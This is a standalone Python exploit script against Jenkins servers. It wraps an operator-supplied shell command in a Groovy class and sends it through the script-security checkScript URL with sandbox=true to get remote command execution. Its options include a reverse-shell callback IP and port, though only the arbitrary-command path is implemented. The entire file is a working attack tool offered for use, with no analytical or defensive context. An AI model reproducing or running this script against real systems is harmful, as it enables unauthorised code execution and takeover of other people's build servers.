#!/usr/bin/env python3
import requests
import argparse

try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

def args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', dest='target', help='Target Jenkins server', action='store', required=True, metavar='URL')
    parser.add_argument('-c', '--cmd', dest='cmd', help='Command to execute', action='store', required=False, metavar='CMD')
    parser.add_argument('-r', '--revshell', dest='shell', help='Execute reverse shell', action='store_true', required=False)
    parser.add_argument('-i', '--ip', dest='callback', help='IP address for reverse shell callback', action='store', required=False, metavar='IP')
    parser.add_argument('-p', '--port', dest='lport', help='Port for reverse shell callback', action='store', required=False, metavar='PORT')
    parser.add_argument('-v', '--verbose', dest='verbose', help='Verbose output', action='store_true', required=False)

    args = parser.parse_args()
    return args.target, args.shell, args.callback, args.lport, args.cmd


def cmd_builder(target, shell, callback, lport, cmd):
    base_cmd = "public class exploit { public exploit() { \"EXPLOIT_REPLACE\".execute() } }"
    if cmd is not None:
        exp = base_cmd.replace("EXPLOIT_REPLACE", cmd)
        print(f"Command:\t{cmd}\n{exp}\n")
    else:
        print("you didn't enter a command")
        exit()

    return exp


def exploit(target, exp):
    url = f"{target}/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value={exp}"
    print(f"Requesting url:\t{url}")
    print("Sending exploit!")

    res = requests.get(url, verify=False)
    if (res.status_code == 200) and (len(res.text) == 6):
        print("Exploit appears to have worked")
    else:
        print("Looks like something went wrong")
        print(f"HTTP Response:\t{res.status_code}")
        print(f"{res.text}")


def main():
    target, shell, callback, lport, cmd = args()
    exp = cmd_builder(target, shell, callback, lport, cmd)
    exploit(target, exp)


if __name__ == "__main__":
    main()

